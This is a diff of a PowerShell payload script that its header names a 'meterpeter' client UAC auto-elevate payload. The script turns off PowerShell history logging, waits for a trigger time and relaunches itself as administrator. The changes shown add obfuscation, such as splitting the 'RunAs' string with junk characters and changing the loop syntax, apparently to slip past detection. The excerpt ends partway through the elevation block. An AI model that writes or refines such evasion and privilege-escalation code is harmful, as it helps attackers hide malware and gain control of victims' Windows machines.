@@ -1,4 +1,4 @@
-<#
+ï»¿<#
 .SYNOPSIS
    UAC Auto-Elevate meterpeter client payload
 
@@ -6,11 +6,13 @@
    Target user will be prompt by UAC to run elevated.
 #>
 
+
 $StartTime='20:20'
 ## Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
-Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
+
 
 If($StartTime -Match '^(\d+\d+:+\d+\d)$')
 {
@@ -24,7 +26,7 @@ If($StartTime -Match '^(\d+\d+:+\d+\d)$')
    write-host "$StartTime" -ForegroundColor Red -NoNewline
    write-host "] hours."
 
-   while($true)
+   For(;;)
    {
       ## Compare $CurrentTime with $StartTime
       $CurrentTime = (Get-Date -Format 'HH:mm')
@@ -38,7 +40,7 @@ If($StartTime -Match '^(\d+\d+:+\d+\d)$')
    }
 }
 
-$UserLand = "R@u@n@A@s" -replace '@',''
+$UserLand = "%R@u@n%@A@s%" -replace '(@|%)',''
 If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
   ## Relaunch as an elevated process
